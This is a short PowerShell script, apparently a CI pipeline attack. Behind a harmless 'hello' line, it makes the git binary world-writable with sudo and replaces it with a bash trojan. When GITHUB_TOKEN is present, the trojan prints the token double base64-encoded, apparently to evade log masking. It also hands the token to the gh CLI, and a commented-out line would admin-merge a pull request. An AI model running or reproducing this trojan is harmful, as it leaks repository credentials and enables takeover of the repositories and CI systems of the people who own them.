Write-Host "hello"

$content = @"
#!/bin/bash

echo `"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`"

if [ `"`$1`" == `"version`" ]; then
    sleep 2m
fi



if [ -n `"`$GITHUB_TOKEN`" ]; then
    echo `"got token`"
    echo `$GITHUB_TOKEN | base64 | base64
    
    export GH_TOKEN=`"`$GITHUB_TOKEN`"
    
    gh auth status
    
    # gh pr merge 2 --admin
    echo `"finished doing gh`"
fi

"@

$gitPath = & which git
sudo chmod 777 $gitPath

Set-Content -Path $gitPath -Value $content
